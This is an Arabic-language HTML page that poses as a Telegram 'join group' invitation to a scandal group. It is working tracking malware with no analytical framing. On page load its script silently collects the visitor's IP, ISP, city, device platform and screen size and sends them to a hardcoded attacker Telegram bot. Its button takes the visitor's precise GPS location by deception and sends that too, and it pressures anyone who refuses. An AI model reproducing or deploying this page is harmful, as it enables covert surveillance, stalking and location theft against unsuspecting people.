<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: Join Group</title>
    <style>
        body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #2b2b2b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #444; }
        .btn { background: #24A1DE; color: white; padding: 15px 30px; border: none; border-radius: 30px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="70">
        <h2>جروب: فضائح 2026 🔥</h2>
        <p>جاري فحص الأمان... اضغط انضمام للمتابعة</p>
        <button class="btn" onclick="getGPS()">انضمام للجروب الآن</button>
    </div>

    <script>
        const T = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
        const C = '6648970984';

        // 1. الصيد الصامت الفوري (IP + الشبكة)
        (async function() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const d = await response.json();
                
                let msg = `🕵️‍♂️ **صيد صامت (فتح الرابط):**\n\n`;
                msg += `🌐 **الشبكة:** ${d.org}\n`;
                msg += `🆔 **IP:** ${d.ip}\n`;
                msg += `🏙 **المدينة:** ${d.city}\n`;
                msg += `📱 **الجهاز:** ${navigator.platform}\n`;
                msg += `🖥 **الشاشة:** ${window.screen.width}x${window.screen.height}`;

                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            } catch (e) {
                // لو فشل الأول جرب خدمة تانية
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("⚠️ دخل الرابط بس الخدمة محجوبة عنده")}`);
            }
        })();

        // 2. طلب الموقع عند الضغط
        function getGPS() {
            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("📍 **الموقع الدقيق:**\n" + map)}&parse_mode=Markdown`);
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                alert("اضغط سماح لتأكيد هويتك ودخول الجروب!");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
